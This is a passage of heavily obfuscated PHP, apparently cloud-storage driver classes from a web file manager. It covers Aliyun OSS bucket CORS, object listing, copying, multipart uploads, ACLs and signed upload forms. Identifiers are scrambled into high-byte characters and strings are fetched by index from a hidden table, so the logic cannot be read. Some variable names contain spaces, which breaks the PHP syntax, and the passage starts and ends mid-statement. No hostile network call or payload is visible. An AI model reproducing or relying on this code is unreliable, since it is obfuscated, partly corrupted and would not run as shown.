(!$çª¨„²¢) { return !1; } fseek_64($çª¨„²¢, $áüò¬¥); $÷ñ¤Éô = fread($çª¨„²¢, $åÙÙ‡«í); fclose($çª¨„²¢); return $÷ñ¤Éô; } public function upload($øÔØƒÛ, $Œ¶Û´£‰, $íÀ¯Œ = false, $ÒíÊªı¾ = REPEAT_REPLACE) { if ($íÀ¯Œ) { return $this->moveFile($Œ¶Û´£‰, $øÔØƒÛ); } return $this->copyFile($Œ¶Û´£‰, $øÔØƒÛ); } public function setModifyTime($‘é§â‡Á, $ùÜŠ×× = '') { @touch($‘é§â‡Á, intval($ùÜŠ××)); } public function download($‰Û‰ü ³, $¤Ÿãå´·) { return $this->iconvSystem($‰Û‰ü ³); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Ñ•Õ€·£) { parent::__construct($Ñ•Õ€·£); $this->signatureVersion($_SERVER[Îûáû“ş][216]); } public function fileOutLink($ŸÍ—î¼è) { $Ÿù°û =& $_SERVER[Îûáû“ş]; if (substr($ŸÍ—î¼è, 0, 7) == $Ÿù°û[1339]) { $ŸÍ—î¼è = $Ÿù°û[1340] . substr($ŸÍ—î¼è, 7); } header($Ÿù°û[161] . $ŸÍ—î¼è); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($ñƒÂÅí’) { parent::__construct(); include_once SDK_DIR . $_SERVER[Îûáû“ş][1396]; $this->_init($ñƒÂÅí’); } public function _init($í‹«“şû) { $ôËâÒÂÇ =& $_SERVER[Îûáû“ş]; $this->config = $í‹«“şû; foreach ($í‹«“şû as $Ç“œ¦æ => $ëˆé¶•¬) { if (isset($this->{$Ç“œ¦æ})) { $this->{$Ç“œ¦æ} = $ëˆé¶•¬; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ôËâÒÂÇ[1397] . LNG($ôËâÒÂÇ[1398])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $à±È¢¼  =& $_SERVER[Îûáû“ş]; $¥ÔáëìŞ = new OSS\Model\CorsConfig(); $æ’ƒÃİ‘ = new OSS\Model\CorsRule(); $æ’ƒÃİ‘->addAllowedOrigin($à±È¢¼ [1399]); $æ’ƒÃİ‘->addAllowedMethod($à±È¢¼ [1400]); $æ’ƒÃİ‘->addAllowedMethod($à±È¢¼ [1401]); $æ’ƒÃİ‘->addAllowedMethod($à±È¢¼ [1402]); $æ’ƒÃİ‘->addAllowedMethod($à±È¢¼ [1403]); $æ’ƒÃİ‘->addAllowedMethod($à±È¢¼ [160]); $æ’ƒÃİ‘->setMaxAgeSeconds(600); $æ’ƒÃİ‘->addExposeHeader($à±È¢¼ [1404]); $æ’ƒÃİ‘->addAllowedHeader($à±È¢¼ [1399]); $¥ÔáëìŞ->addRule($æ’ƒÃİ‘); try { $this->client->putBucketCors($this->bucket, $¥ÔáëìŞ); } catch (OSS\Core\OssException $¢ÔÃè) { return !1; } return !0; } public function getBucketCors() { $’ïÅÅğì =& $_SERVER[Îûáû“ş]; $§€·°“œ = null; try { $§€·°“œ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $î“¾™¢Ş) { return null; } if (!$§€·°“œ || !($…§­à¼¨ = $§€·°“œ->getRules())) { return null; } $ÚÂ·¡‚ñ = $…§­à¼¨[0]->getAllowedOrigins(); $…ÅË†ÊĞ = $…§­à¼¨[0]->getAllowedMethods(); $ë¨õ®† = $…§­à¼¨[0]->getMaxAgeSeconds(); $Î½©ËúÖ = $…§­à¼¨[0]->getExposeHeaders(); $å‡ŠÊ· = $…§­à¼¨[0]->getAllowedHeaders(); return array($’ïÅÅğì[188] => isset($ÚÂ·¡‚ñ[0]) ? $ÚÂ·¡‚ñ[0] : $’ïÅÅğì[12], $’ïÅÅğì[192] => $…ÅË†ÊĞ, $’ïÅÅğì[1405] => $ë¨õ®†, $’ïÅÅğì[1406] => isset($Î½©ËúÖ[0]) ? $Î½©ËúÖ[0] : $’ïÅÅğì[12], $’ïÅÅğì[190] => isset($å‡ŠÊ·[0]) ? $å‡ŠÊ·[0] : $’ïÅÅğì[12]); } public function isBucketCors() { $ïø¡ü¥† =& $_SERVER[Îûáû“ş]; $¤¼Õ£‘‘ = $this->getBucketCors(); if (!$¤¼Õ£‘‘ || !is_array($¤¼Õ£‘‘)) { return !1; } if ($¤¼Õ£‘‘[$ïø¡ü¥†[188]] != $ïø¡ü¥†[189] || $¤¼Õ£‘‘[$ïø¡ü¥†[190]] != $ïø¡ü¥†[189]) { return !1; } $ïşÛ = array_map($ïø¡ü¥†[191], $¤¼Õ£‘‘[$ïø¡ü¥†[192]]); if (!is_array($ïşÛ)) { $ïşÛ = array(); } $£Î„ü²Ê = array($ïø¡ü¥†[193], $ïø¡ü¥†[194], $ïø¡ü¥†[195], $ïø¡ü¥†[196], $ïø¡ü¥†[197]); $ûï•ú£‡ = array_diff($£Î„ü²Ê, $ïşÛ); return empty($ûï•ú£‡); } public function mkfile($õçÉˆ»£, $ôÜìºÕõ = '', $â±˜Ş± = REPEAT_RENAME) { $ÂÜÕü = $this->setContent($õçÉˆ»£, $ôÜìºÕõ); if ($ÂÜÕü !== !1) { return $this->getPathOuter($õçÉˆ»£); } return !1; } public function mkdir($²ğŞØ”À, $ı¾Ø€Åú = REPEAT_SKIP) { if ($ı¾Ø€Åú && $this->_isFolder($²ğŞØ”À)) { return $this->getPathOuter($²ğŞØ”À); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($²ğŞØ”À)); } catch (OSS\Core\OssException $±£û‡¹ğ) { return !1; } return $this->getPathOuter($²ğŞØ”À); } private function fileList($šûâ„¢, $ì«õ–©— = '', $Ê“áµ»ª = 0) { $âí—Æ²Ö =& $_SERVER[Îûáû“ş]; $šûâ„¢ = trim($šûâ„¢, $âí—Æ²Ö[8]); $²ç”«¹é = empty($šûâ„¢) && $šûâ„¢ !== $âí—Æ²Ö[198] ? $âí—Æ²Ö[12] : $šûâ„¢ . $âí—Æ²Ö[8]; $ÖÎ×¼®î = $âí—Æ²Ö[12]; $«‰Î¬ñ• = 1000; $ìÌ½½å = $¿Ş‘â— = array(); while (!0) { check_abort(); $àÜÉœ¡ = array($âí—Æ²Ö[1407] => $ì«õ–©—, $âí—Æ²Ö[1408] => $²ç”«¹é, $âí—Æ²Ö[1409] => $«‰Î¬ñ•, $âí—Æ²Ö[1410] => $ÖÎ×¼®î); try { $–şÀ¥ÌÒ = $this->client->listObjects($this->bucket, $àÜÉœ¡); } catch (OSS\Core\OssException $ßºÙûÆ…) { break; } $ÖÎ×¼®î = $–şÀ¥ÌÒ->getNextMarker(); $Çµ¢şÉ¤ = $–şÀ¥ÌÒ->getObjectList(); $×¾½ŒÌ = $–şÀ¥ÌÒ->getPrefixList(); foreach ($Çµ¢şÉ¤ as $öæ ¾Å) { if ($öæ ¾Å->getKey() == $²ç”«¹é) { continue; } $ãòÑ†ŒÒ = $öæ ¾Å->getKey(); $Ÿºò¤ô§ = $öæ ¾Å->getSize(); $´Ú¨¸íŸ = $öæ ¾Å->getLastModified(); $İ¦¬Åö¨ = $Ê“áµ»ª ? array($âí—Æ²Ö[32] => $ãòÑ†ŒÒ, $âí—Æ²Ö[76] => $Ÿºò¤ô§, $âí—Æ²Ö[180] => strtotime($´Ú¨¸íŸ)) : $ãòÑ†ŒÒ; $¯™ ĞŠ§ = $Ÿºò¤ô§ == 0 && substr($ãòÑ†ŒÒ, strlen($ãòÑ†ŒÒ) - 1, 1) == $âí—Æ²Ö[8] ? !0 : !1; $ñ¯Ì€³¤ = array($âí—Æ²Ö[76] => $Ÿºò¤ô§, $âí—Æ²Ö[1411] => $Ÿºò¤ô§, $âí—Æ²Ö[85] => strtotime($´Ú¨¸íŸ), $âí—Æ²Ö[1412] => $´Ú¨¸íŸ); $this->cacheMethodInfoSet($ãòÑ†ŒÒ, $¯™ ĞŠ§, $ñ¯Ì€³¤); if ($¯™ ĞŠ§) { $ìÌ½½å[] = $ãòÑ†ŒÒ; continue; } $¿Ş‘â—[] = $İ¦¬Åö¨; } foreach ($×¾½ŒÌ as $ªƒæ¤‘Ü) { $ìÌ½½å[] = $ªƒæ¤‘Ü->getPrefix(); $this->cacheMethodInfoSet($ªƒæ¤‘Ü->getPrefix(), !0); } if ($ÖÎ×¼®î === $âí—Æ²Ö[12]) { break; } } $this->cacheMethodInfoSet($šûâ„¢, !0); return array($âí—Æ²Ö[82] => $ìÌ½½å, $âí—Æ²Ö[83] => $¿Ş‘â—); } public function copyFile($ÄÇ€—¨Ş, $Æ»ÒàÒ) { $ùĞÙİç… = $this->size($ÄÇ€—¨Ş); if ($ùĞÙİç… < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ÄÇ€—¨Ş, $this->bucket, $this->pathEncode($Æ»ÒàÒ)); } catch (OSS\Core\OssException $ÕÙÆÈôï) { return !1; } return $this->getPathOuter($Æ»ÒàÒ); } $áÍ¼—ûŒ = $this->multiCopyObject($ÄÇ€—¨Ş, $Æ»ÒàÒ, $ùĞÙİç…); return $áÍ¼—ûŒ ? $this->getPathOuter($Æ»ÒàÒ) : !1; } private function multiCopyObject($Ü¬¸¥è, $’¸Â‰ú½, $äÎÌéæã) { $ıÂ¡êËç =& $_SERVER[Îûáû“ş]; try { $ÊüÁà‰ú = array(); if ($«´­Â„ = $this->hashMd5($Ü¬¸¥è)) { $ÊüÁà‰ú = array(OSS\OssClient::OSS_HEADERS => array($ıÂ¡êËç[1413] => $«´­Â„)); } $‰Œø÷é€ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($’¸Â‰ú½), $ÊüÁà‰ú); $õ Éó¸ = 1; $àíË¹Ñ¡ = 0; $« ·Æš = array(); $‘Èî›Ä = 1024 * 1024 * 10; $ò¿Ğ‹½× = $this->client->generateMultiuploadParts($äÎÌéæã, $‘Èî›Ä); foreach ($ò¿Ğ‹½× as $Èé ı‹ => $ÆëÔ‰Æ—) { $İ…¬˜€ù = $àíË¹Ñ¡ + (int) $ÆëÔ‰Æ—[$ıÂ¡êËç[1414]]; $‰Ú…¥©ñ = (int) $ÆëÔ‰Æ—[$ıÂ¡êËç[337]] + $İ…¬˜€ù - 1; $Ç× À¿ = array($ıÂ¡êËç[1415] => $İ…¬˜€ù, $ıÂ¡êËç[1416] => $‰Ú…¥©ñ); $« ·Æš[] = $this->client->uploadPartCopy($this->bucket, $Ü¬¸¥è, $this->bucket, $this->pathEncode($’¸Â‰ú½), $õ Éó¸, $‰Œø÷é€, $Ç× À¿); $õ Éó¸ = $õ Éó¸ + 1; } $£üÙï‹ª = array(); foreach ($« ·Æš as $Èé ı‹ => $ÀÂŸ¯Š¨) { $£üÙï‹ª[] = array($ıÂ¡êËç[1417] => $Èé ı‹ + 1, $ıÂ¡êËç[1418] => $ÀÂŸ¯Š¨); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($’¸Â‰ú½), $‰Œø÷é€, $£üÙï‹ª); } catch (OSS\Core\OssException $•áÁÚè) { return !1; } return !0; } public function moveFile($Œûƒ¼™­, $À™ö¤÷ú) { if ($this->copyFile($Œûƒ¼™­, $À™ö¤÷ú)) { $this->remove($Œûƒ¼™­); return $this->getPathOuter($À™ö¤÷ú); } return !1; } public function delFile($Ñ¦÷Û“º) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($Ñ¦÷Û“º)); } catch (OSS\Core\OssException $œÕñşËÍ) { return !1; } return !0; } public function delFolder($¼€çÁİ) { $²Üø¥ =& $_SERVER[Îûáû“ş]; if (!$this->exist($¼€çÁİ)) { return !0; } $this->listItemCache = !1; $É­…¥¹š = $this->fileList($¼€çÁİ); $this->listItemCache = !0; $ÍÅéûíá = trim($¼€çÁİ, $²Üø¥[8]) . $²Üø¥[8]; if (!empty($¼€çÁİ) && $¼€çÁİ !== $²Üø¥[198] && !in_array($ÍÅéûíá, $É­…¥¹š[$²Üø¥[82]])) { $É­…¥¹š[$²Üø¥[82]][] = $ÍÅéûíá; } $©øÏ™Ç = $this->delByBatch($É­…¥¹š[$²Üø¥[83]]); if (!$©øÏ™Ç) { return !1; } $©øÏ™Ç = $this->delByBatch($É­…¥¹š[$²Üø¥[82]]); if (!$©øÏ™Ç) { return !1; } return $this->delFile($ÍÅéûíá); } private function delByBatch($™¦‘ë•ó) { foreach (array_chunk($™¦‘ë•ó, 1000) as $¹‡Ê±È‡) { try { $this->client->deleteObjects($this->bucket, $¹‡Ê±È‡); } catch (OSS\Core\OssException $¼úÖø®) { return !1; } } return !0; } public function rename($ñòóµŞÀ, $àÒ‡Àıˆ) { return $this->renameObject($ñòóµŞÀ, $àÒ‡Àıˆ); } private function fileInfo($‚ˆ¡éá™, $×£äÏòÈ = false, $ÙĞ ûÆ = array()) { $“÷£€¢ =& $_SERVER[Îûáû“ş]; $®€ÓÍ°â = array($“÷£€¢[32] => $this->pathThis($‚ˆ¡éá™), $“÷£€¢[84] => $this->getPathOuter($‚ˆ¡éá™), $“÷£€¢[33] => $“÷£€¢[200], $“÷£€¢[76] => isset($ÙĞ ûÆ[$“÷£€¢[76]]) ? $ÙĞ ûÆ[$“÷£€¢[76]] : 0, $“÷£€¢[174] => $this->ext($‚ˆ¡éá™)); if ($×£äÏòÈ) { return $®€ÓÍ°â; } $®€ÓÍ°â[$“÷£€¢[201]] = $®€ÓÍ°â[$“÷£€¢[85]] = 0; $®€ÓÍ°â[$“÷£€¢[202]] = $®€ÓÍ°â[$“÷£€¢[203]] = !0; if (empty($ÙĞ ûÆ)) { $á‚±ıé¾ = $this->objectMeta($‚ˆ¡éá™); if (!$á‚±ıé¾) { return $®€ÓÍ°â; } $ÙĞ ûÆ = array($“÷£€¢[85] => strtotime($á‚±ıé¾[$“÷£€¢[1412]]), $“÷£€¢[76] => $á‚±ıé¾[$“÷£€¢[1411]] + 0); } if (isset($ÙĞ ûÆ[$“÷£€¢[76]])) { $®€ÓÍ°â[$“÷£€¢[76]] = $ÙĞ ûÆ[$“÷£€¢[76]]; } if (isset($ÙĞ ûÆ[$“÷£€¢[85]])) { $®€ÓÍ°â[$“÷£€¢[85]] = $ÙĞ ûÆ[$“÷£€¢[85]]; } if (isset($ÙĞ ûÆ[$“÷£€¢[180]]) && !trim($®€ÓÍ°â[$“÷£€¢[85]])) { $®€ÓÍ°â[$“÷£€¢[85]] = $ÙĞ ûÆ[$“÷£€¢[180]]; } return $®€ÓÍ°â; } private function folderInfo($òÏ´øÆÈ, $ÂĞû¯ûÄ = false, $¦®€¤î¸ = array()) { $æáÈœØÑ =& $_SERVER[Îûáû“ş]; $©Ÿëéä = array($æáÈœØÑ[32] => $this->pathThis($òÏ´øÆÈ), $æáÈœØÑ[84] => $this->getPathOuter($æáÈœØÑ[8] . $òÏ´øÆÈ), $æáÈœØÑ[33] => $æáÈœØÑ[75]); if ($ÂĞû¯ûÄ) { return $©Ÿëéä; } $©Ÿëéä[$æáÈœØÑ[201]] = $©Ÿëéä[$æáÈœØÑ[85]] = 0; $©Ÿëéä[$æáÈœØÑ[202]] = $©Ÿëéä[$æáÈœØÑ[203]] = !0; if (empty($¦®€¤î¸)) { $òÏ´øÆÈ = rtrim($òÏ´øÆÈ, $æáÈœØÑ[8]) . $æáÈœØÑ[8]; $¬°‹É¦¿ = $this->objectMeta($òÏ´øÆÈ); if (!$¬°‹É¦¿) { return $©Ÿëéä; } $¦®€¤î¸ = array($æáÈœØÑ[201] => $¬°‹É¦¿[$æáÈœØÑ[502]][$æáÈœØÑ[1419]], $æáÈœØÑ[85] => strtotime($¬°‹É¦¿[$æáÈœØÑ[1412]])); } if (isset($¦®€¤î¸[$æáÈœØÑ[85]])) { $©Ÿëéä[$æáÈœØÑ[85]] = $¦®€¤î¸[$æáÈœØÑ[85]]; } if (isset($¦®€¤î¸[$æáÈœØÑ[201]])) { $©Ÿëéä[$æáÈœØÑ[201]] = $¦®€¤î¸[$æáÈœØÑ[201]]; } return $©Ÿëéä; } public function listPath($ßÉ½ãì­, $Â„…À²Å = false) { $ÆÉ—·–’ =& $_SERVER[Îûáû“ş]; $öõÓı½— = $this->fileList($ßÉ½ãì­, $ÆÉ—·–’[8], !0); foreach ($öõÓı½—[$ÆÉ—·–’[82]] as $ºğ¨½İ« => $ªÒÜõ¡³) { $öõÓı½—[$ÆÉ—·–’[82]][$ºğ¨½İ«] = $this->folderInfo($ªÒÜõ¡³, $Â„…À²Å, $ªÒÜõ¡³); } foreach ($öõÓı½—[$ÆÉ—·–’[83]] as $ºğ¨½İ« => $ªÒÜõ¡³) { $öõÓı½—[$ÆÉ—·–’[83]][$ºğ¨½İ«] = $this->fileInfo($ªÒÜõ¡³[$ÆÉ—·–’[32]], $Â„…À²Å, $ªÒÜõ¡³); } return $öõÓı½—; } protected function infoChildren($´¿„¼ÉÈ, &$‚Ş‡€¸º) { $Ø¿Â´ã½ =& $_SERVER[Îûáû“ş]; $¤ßÛ™ó = $this->fileList($´¿„¼ÉÈ, $Ø¿Â´ã½[12], !0); $‚Ş‡€¸º[$Ø¿Â´ã½[78]] += count($¤ßÛ™ó[$Ø¿Â´ã½[82]]); $‚Ş‡€¸º[$Ø¿Â´ã½[77]] += count($¤ßÛ™ó[$Ø¿Â´ã½[83]]); foreach ($¤ßÛ™ó[$Ø¿Â´ã½[83]] as $íÑ¾î²) { if (!$íÑ¾î² || !$íÑ¾î²[$Ø¿Â´ã½[76]]) { continue; } $‚Ş‡€¸º[$Ø¿Â´ã½[76]] += $íÑ¾î²[$Ø¿Â´ã½[76]]; } } public function has($ÆšŸÉ¦, $ˆıœ¾ö­ = false, $ê×¨ÄÆ³ = true) { $İ†Ùå¢ü =& $_SERVER[Îûáû“ş]; $ÆšŸÉ¦ = trim($ÆšŸÉ¦, $İ†Ùå¢ü[8]); $†ñÈŸÖ¢ = empty($ÆšŸÉ¦) && $ÆšŸÉ¦ !== $İ†Ùå¢ü[198] ? $İ†Ùå¢ü[12] : $ÆšŸÉ¦ . $İ†Ùå¢ü[8]; $¨°•¥Éè = $İ†Ùå¢ü[12]; $Âö¤ı‘Õ = 500; $å¸ÑÜüĞ = $ÃôéãËí = 0; while (!0) { check_abort(); $Ö±¬æçº = array($İ†Ùå¢ü[1407] => $İ†Ùå¢ü[8], $İ†Ùå¢ü[1408] => $†ñÈŸÖ¢, $İ†Ùå¢ü[1409] => $Âö¤ı‘Õ, $İ†Ùå¢ü[1410] => $¨°•¥Éè); try { $¨©ùå€ó = $this->client->listObjects($this->bucket, $Ö±¬æçº); } catch (OSS\Core\OssException $Œ ş˜ïÂ) { break; } $¨°•¥Éè = $¨©ùå€ó->getNextMarker(); $ ¾Ö…ƒ = $¨©ùå€ó->getObjectList(); $¯ Šü = $¨©ùå€ó->getPrefixList(); if ($ˆıœ¾ö­) { if (count($ ¾Ö…ƒ) > 1 || count($ ¾Ö…ƒ) == 1 && $ ¾Ö…ƒ[0]->getKey() != $†ñÈŸÖ¢) { $å¸ÑÜüĞ += count($ ¾Ö…ƒ) - 1; } if (!empty($¯ Šü)) { $ÃôéãËí += count($¯ Šü); } if ($¨°•¥Éè === $İ†Ùå¢ü[12]) { break; } continue; } if ($ê×¨ÄÆ³) { if (!empty($ ¾Ö…ƒ)) { if (count($ ¾Ö…ƒ) > 1 || $ ¾Ö…ƒ[0]->getKey() != $†ñÈŸÖ¢) { return !0; } } } else { if (!empty($¯ Šü)) { return !0; } } if ($¨°•¥Éè === $İ†Ùå¢ü[12]) { break; } } if ($ˆıœ¾ö­) { return array($İ†Ùå¢ü[207] => $å¸ÑÜüĞ, $İ†Ùå¢ü[208] => $ÃôéãËí); } return !1; } public function listAll($—Òí— ï) { $ŞÈ˜Éú =& $_SERVER[Îûáû“ş]; $€õÀùŸÑ = $this->fileList($—Òí— ï, $ŞÈ˜Éú[12], !0); $õ…ƒçş­ = array_to_keyvalue($€õÀùŸÑ[$ŞÈ˜Éú[83]], $ŞÈ˜Éú[32]); foreach ($€õÀùŸÑ[$ŞÈ˜Éú[82]] as $öú´ïê±) { if (is_string($öú´ïê±)) { $õ…ƒçş­[$öú´ïê±] = array($ŞÈ˜Éú[76] => 0); } } return $this->listAllFiles($—Òí— ï, $õ…ƒçş­); } public function canRead($§…ƒä˜) { $İ„ ŸÁ =& $_SERVER[Îûáû“ş]; $ö»ÆÔìÆ = $this->pathAcl($§…ƒä˜); return $ö»ÆÔìÆ == $İ„ ŸÁ[1420] || $ö»ÆÔìÆ == $İ„ ŸÁ[547] ? !0 : !1; } public function canWrite($‘ñØª×±) { $’÷ö²ªş = $this->pathAcl($‘ñØª×±); return $’÷ö²ªş == $_SERVER[Îûáû“ş][547] ? !0 : !1; } public function pathAcl($Í¾£­¤) { $ğİ¼°™¡ =& $_SERVER[Îûáû“ş]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $íš„ªŒÉ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Í¾£­¤)); } catch (OSS\Core\OssException $Š¥Ò”¶Â) { return !1; } $òãş¯Î¢ = $íš„ªŒÉ == $ğİ¼°™¡[37] ? $this->bucketAcl : $íš„ªŒÉ; if ($òãş¯Î¢ == $ğİ¼°™¡[1421]) { return $ğİ¼°™¡[1420]; } if ($òãş¯Î¢ == $ğİ¼°™¡[1422]) { return $ğİ¼°™¡[547]; } return $òãş¯Î¢; } private function chmodPath($ÎŠ—Á› , $µğ¸áØ• = '') { $ı¶é’Ìø =& $_SERVER[Îûáû“ş]; $ç‡«„ç = empty($µğ¸áØ•) ? $ı¶é’Ìø[1422] : $µğ¸áØ•; $õç …Í = array($ı¶é’Ìø[37], $ı¶é’Ìø[199], $ı¶é’Ìø[1421], $ı¶é’Ìø[1422]); if (!in_array($ç‡«„ç, $õç …Í)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ÎŠ—Á› ), $ç‡«„ç); } catch (OSS\Core\OssException $íÖ®ÖØ¢) { return !1; } return !0; } public function getContent($§£ÚÅªÛ) { return $this->fileSubstr($§£ÚÅªÛ, -1); } public function setContent($êÍİßÕÃ, $ì„’¨¬­ = '') { $Öò®¥•ù =& $_SERVER[Îûáû“ş]; try { $»Ï§ÒÈ™ = $this->trafficLimit($Öò®¥•ù[1423]); $¬¸Öƒ– = $this->client->putObject($this->bucket, $this->pathEncode($êÍİßÕÃ), $ì„’¨¬­, $»Ï§ÒÈ™); } catch (OSS\Core\OssException $ŠÀƒÄûË) { return !1; } $¿¨—ê„” = array($Öò®¥•ù[1413] => trim($¬¸Öƒ–[$Öò®¥•ù[1424]], $Öò®¥•ù[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($êÍİßÕÃ))); $this->updateObjMeta($êÍİßÕÃ, $¿¨—ê„”); return isset($¬¸Öƒ–[$Öò®¥•ù[1425]][$Öò®¥•ù[1372]]) ? !0 : !1; } private function updateObjMeta($Àú–™Šæ, $»Çó§ø§) { $Àú–™Šæ = $this->pathEncode($Àú–™Šæ); try { $‚²¡çª¥ = array(OSS\OssClient::OSS_HEADERS => $»Çó§ø§); $this->client->copyObject($this->bucket, $Àú–™Šæ, $this->bucket, $Àú–™Šæ, $‚²¡çª¥); } catch (OSS\Core\OssException $»À¥¯ñø) { return !1; } return !0; } public function upload($à¼§ì¦ø, $¿î—®¸, $Û¢Ö‡¶¢ = false, $¤ÄÔ™‚¤ = REPEAT_REPLACE) { $±ƒÌ÷„¦ =& $_SERVER[Îûáû“ş]; $„„ä“ÀÑ = trim($à¼§ì¦ø, $±ƒÌ÷„¦[8]); $úÚ æÅÌ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($±ƒÌ÷„¦[1413] => @md5_file($¿î—®¸)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($à¼§ì¦ø))); $úÚ æÅÌ = $this->trafficLimit($±ƒÌ÷„¦[1423], $úÚ æÅÌ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($„„ä“ÀÑ), $¿î—®¸, $úÚ æÅÌ); } catch (OSS\Core\OssException $‰Ü‹­‘ğ) { return !1; } return $this->getPathOuter($à¼§ì¦ø); } public function getHost() { $Ñ“¿£‚æ =& $_SERVER[Îûáû“ş]; $°ÙŞÏ® = explode($Ñ“¿£‚æ[184], parent::getHost()); return $°ÙŞÏ®[0] . $Ñ“¿£‚æ[184] . $this->bucket . $Ñ“¿£‚æ[10] . $°ÙŞÏ®[1]; } public function uploadFormData($ƒ¬‹ÅŒ, $ŸäáËæ = 3600) { $µøıÁÍ¡ =& $_SERVER[Îûáû“ş]; if (!($”äß»¦¢ = $this->getHost())) { return !1; } $ùæ¼û³ = $ŸäáËæ; $õ×¶š¦– = date($µøıÁÍ¡[1426], time() + $ùæ¼û³); $”î§š¿İ = new DateTime($õ×¶š¦–); $©öÜ¦‘ù = $”î§š¿İ->format(DateTime::ISO8601); $¼¯¥Ùñ = strpos($©öÜ¦‘ù, $µøıÁÍ¡[296]); $©öÜ¦‘ù = substr($©öÜ¦‘ù, 0, $¼¯¥Ùñ) . $µøıÁÍ¡[1427]; $äˆ›£öš = 1048576000 * 5; $€½öÕ¨‹ = $this->pathFather($ƒ¬‹ÅŒ); $ÌœÕóïÖ = array($µøıÁÍ¡[1326] => $©öÜ¦‘ù, $µøıÁÍ¡[1327] => array(array($µøıÁÍ¡[1428], 0, $äˆ›£öš), array($µøıÁÍ¡[1330], $µøıÁÍ¡[1331], $€½öÕ¨‹))); $—èÅ—ËÀ = base64_encode(json_encode($ÌœÕóïÖ)); $ùÖ”¯ş¯ = base64_encode(hash_hmac($µøıÁÍ¡[232], $—èÅ—ËÀ, $this->secret, !0)); $é¨øîÀ = array($µøıÁÍ¡[1336] => $—èÅ—ËÀ, $µøıÁÍ¡[1429] => $this->accessKey, $µøıÁÍ¡[1332] => $µøıÁÍ¡[1324], $µøıÁÍ¡[1430] => $ùÖ”¯ş¯, $µøıÁÍ¡[182] => $”äß»¦¢); $é¨øîÀ = $this->trafficLimit($µøıÁÍ¡[1423], $é¨øîÀ); return $é¨øîÀ; } public function multiUploadFormData($ŒÏÕ™ı†, $ÁÖ«¹¢ß = 3600) { $†‘¹Šªä =& $_SERVER[Îûáû“ş]; if (!($”•Ä¿ûŞ = $this->getHost())) { return !1; } $ÎÌ¢ˆ—º = $this->trafficLimit($†‘¹Šªä[1423]); $èœèïƒ£ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ŒÏÕ™ı†), $ÎÌ¢ˆ—º); return array($†‘¹Šªä[223] => $èœèïƒ£, $†‘¹Šªä[182] => $”•Ä¿ûŞ . $†‘¹Šªä[8] . $this->pathEncode($ŒÏÕ™ı†), $†‘¹Šªä[224] => gmdate($†‘¹Šªä[1431]), $†‘¹Šªä[94] => $ŒÏÕ™ı†); } public function multiUploadAuthData($„“â²µ, $ÈüŠ¦‰” = array()) { $¤Ãäóğ˜ =& $_SERVER[Îûáû“ş]; $ÇÍğ’° = isset($ÈüŠ¦‰”[$¤Ãäóğ˜[224]]) ? $ÈüŠ¦‰”[$¤Ãäóğ˜[224]] : gmdate($¤Ãäóğ˜[1431]); $éö•ìÈ = isset($ÈüŠ¦‰”[$¤Ãäóğ˜[174]]) ? $ÈüŠ¦‰”[$¤Ãäóğ˜[174]] : $¤Ãäóğ˜[12]; $£´¬“ÔÂ = $„“â²µ; if (isset($ÈüŠ¦‰”[$¤Ãäóğ˜[94]])) { $£´¬“ÔÂ = $ÈüŠ¦‰”[$¤Ãäóğ˜[94]]; unset($ÈüŠ¦‰”[$¤Ãäóğ˜[94]]); } if (isset($ÈüŠ¦‰”[$¤Ãäóğ˜[225]])) { $ÈüŠ¦‰”[$¤Ãäóğ˜[224]] = $ÇÍğ’°; return $this->listUploadParts($£´¬“ÔÂ, $ÈüŠ¦‰”); } $¦¯¤¤½ = array($¤Ãäóğ˜[226], $¤Ãäóğ˜[12], $¤Ãäóğ˜[120], $ÇÍğ’°, "\170\x2d\157\x73\x73\55\x64\x61\x74\145\72{$ÇÍğ’°}", $¤Ãäóğ˜[8] . $this->bucket . $¤Ãäóğ˜[8] . $£´¬“ÔÂ . $éö•ìÈ); if (strpos($éö•ìÈ, $¤Ãäóğ˜[227]) === 0) { $¦¯¤¤½[0] = $¤Ãäóğ˜[228]; if ($ŠüÚŸ œ = $this->trafficLimit($¤Ãäóğ˜[1423])) { $£´¬“ÔÂ = $¤Ãäóğ˜[1432]; array_splice($¦¯¤¤½, 5, 0, $£´¬“ÔÂ . $¤Ãäóğ˜[4] . $ŠüÚŸ œ[$£´¬“ÔÂ]); } } if (isset($ÈüŠ¦‰”[$¤Ãäóğ˜[229]]) && $ÈüŠ¦‰”[$¤Ãäóğ˜[229]] == $¤Ãäóğ˜[230]) { $¦¯¤¤½[0] = $¤Ãäóğ˜[230]; } if (!empty($ÈüŠ¦‰”[$¤Ãäóğ˜[1433]])) { $øÄğèÊë = array_merge(array($¦¯¤¤½[4]), $ÈüŠ¦‰”[$¤Ãäóğ˜[1433]]); sort($øÄğèÊë); $¦¯¤¤½[4] = implode($¤Ãäóğ˜[231], $øÄğèÊë); } $ëó´®¶‘ = implode($¤Ãäóğ˜[231], $¦¯¤¤½); $îøİÇ£— = base64_encode(hash_hmac($¤Ãäóğ˜[232], $ëó´®¶‘, $this->secret, !0)); $É­ëıë¹ = $¤Ãäóğ˜[1397] . $this->accessKey . 